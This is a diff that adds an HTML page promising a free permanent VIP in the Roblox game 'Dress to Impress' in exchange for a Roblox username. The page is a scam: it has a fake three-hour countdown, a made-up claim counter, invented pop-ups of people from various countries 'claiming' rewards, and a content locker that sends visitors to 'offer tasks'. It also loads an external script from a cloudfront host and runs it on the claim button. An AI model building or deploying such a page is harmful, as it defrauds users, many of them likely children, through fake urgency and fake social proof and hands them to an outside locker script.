@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your VIP Reward</title>
+    <style>
+        /* General Styles */
+
+        body {
+            background-color: #202020;
+            font-family: 'Roboto', sans-serif;
+            text-align: center;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Container Styling */
+
+        .container {
+            margin: 20px auto;
+            padding: 30px;
+            background-color: #333;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+        }
+
+        /* VIP Icon Styling */
+
+        .vip-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            border: 2px solid #f4d03f;
+            border-radius: 50%;
+            padding: 5px;
+            background-color: #fff;
+        }
+
+        /* Profile Picture Placeholder */
+
+        .profile-picture {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            margin: 20px 0;
+            border: 4px solid #f4d03f;
+            animation: pulse 2s infinite;
+        }
+
+        /* Animation */
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* Input Field Styling */
+
+        input[type="text"] {
+            width: 85%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 2px solid #f4d03f;
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: #444;
+            color: #fff;
+        }
+
+        /* Button Styling */
+
+        button {
+            background-color: #f4d03f;
+            color: #202020;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #ffd700;
+        }
+
+        /* Text Styling */
+
+        p {
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        /* Content Locker Section */
+
+        #offerContainer {
+            display: none;
+            margin-top: 30px;
+        }
+
+        /* Countdown Timer Styling */
+
+        .countdown {
+            font-size: 18px;
+            margin: 20px 0;
+            color: #f4d03f;
+        }
+
+        /* Progress Section */
+
+        .progress {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #f4d03f;
+        }
+
+        /* Notification Styling */
+
+        .notification {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: #444;
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            font-size: 14px;
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        /* Footer Styling */
+
+        footer {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #aaa;
+        }
+
+        /* Responsive Styling */
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            .vip-icon {
+                width: 50px;
+                height: 50px;
+            }
+            .profile-picture {
+                width: 100px;
+                height: 100px;
+            }
+            input[type="text"] {
+                width: 90%;
+                font-size: 14px;
+            }
+            button {
+                padding: 10px 20px;
+                font-size: 16px;
+            }
+        }
+    </style>
+    <script type="text/javascript">
+        var nOist_nDs_iaQvZc = {
+            "it": 4366416,
+            "key": "9ac85"
+        };
+
+        // Countdown Timer Script
+        function startCountdown(duration, display) {
+            var timer = duration,
+                hours, minutes, seconds;
+            setInterval(function() {
+                hours = parseInt(timer / 3600, 10);
+                minutes = parseInt((timer % 3600) / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = hours + "h " + minutes + "m " + seconds + "s ";
+
+                if (--timer < 0) {
+                    display.textContent = "Offer Expired";
+                    document.getElementById("claimForm").style.display = 'none';
+                }
+            }, 1000);
+        }
+
+        window.onload = function() {
+            var threeHours = 60 * 60 * 3, // 3 hours in seconds
+                display = document.querySelector('#countdown');
+            startCountdown(threeHours, display);
+            startNotifications();
+        };
+
+        // VIP claims script
+        var totalClaims = 510;
+
+        function claimVIP() {
+            if (totalClaims < 1000) {
+                totalClaims++;
+                document.getElementById('claimProgress').textContent = totalClaims + " CLAIMS ON 1000 VIP AVAILABLE";
+            }
+        }
+
+        function showLocker() {
+            document.getElementById('offerContainer').style.display = 'block';
+            claimVIP();
+        }
+
+        // Random Notifications for VIP Claims
+        function startNotifications() {
+            var names = ["Alex", "Jordan", "Sam", "Taylor", "Chris", "Jamie", "Morgan", "Avery", "Blake", "Riley"];
+            var locations = [
+                "🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇦🇺 Australia", "🇩🇪 Germany",
+                "🇫🇷 France", "🇯🇵 Japan", "🇮🇳 India", "🇧🇷 Brazil", "🇪🇸 Spain"
+            ];
+            var notification = document.getElementById('vipNotification');
+
+            setInterval(function() {
+                var randomName = names[Math.floor(Math.random() * names.length)];
+                var randomLocation = locations[Math.floor(Math.random() * locations.length)];
+                notification.textContent = randomName + " from " + randomLocation + " just claimed their VIP reward!";
+                notification.style.display = 'block';
+                notification.style.opacity = 1;
+                setTimeout(function() {
+                    notification.style.opacity = 0;
+                    notification.style.display = 'none';
+                }, 3000);
+            }, Math.random() * 5000 + 3000); // Show notification every 3-8 seconds
+        }
+    </script>
+    <script src="https://d26h1wdc757l2w.cloudfront.net/8e20d51.js"></script>
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- VIP Icon -->
+        <img src="https://tr.rbxcdn.com/56d936eb0078e70e7a9efffdbe99b0a5/420/420/Image/Png" alt="VIP Icon" class="vip-icon">
+
+        <!-- Header and Instructions -->
+        <h2>Congratulations! You’ve won a Permanent VIP in Dress to Impress</h2>
+        <p> Enter your Roblox username to claim it</p>
+
+        <!-- Countdown Timer -->
+        <div class="countdown">
+            <p>Offer will expire in: <span id="countdown">Loading...</span></p>
+        </div>
+
+        <!-- Claim Progress -->
+        <div class="progress" id="claimProgress">
+            <!--<p>510 CLAIMS ON 1000 VIP AVAILABLE</p>-->
+        </div>
+
+        <!-- Form for Username Input -->
+        <form id="claimForm">
+            <input type="text" id="username" placeholder="Your Roblox Username" required>
+            <br>
+            <button type="button" onclick="_uj(); showLocker()">Claim VIP</button>
+        </form>
+        <p id="status"></p>
+    </div>
+
+    <!-- Offer Container for Content Locker -->
+    <div id="offerContainer">
+        <p>Complete one of the following tasks to unlock your reward:</p>
+        <!-- Add your offer tasks here -->
+    </div>
+
+    <!-- Random VIP Claim Notification -->
+    <div class="notification" id="vipNotification"></div>
+
+    <footer>
+        <p>&copy; 2024 All Rights Reserved</p>
+    </footer>
+
+</body>
+
+</html>
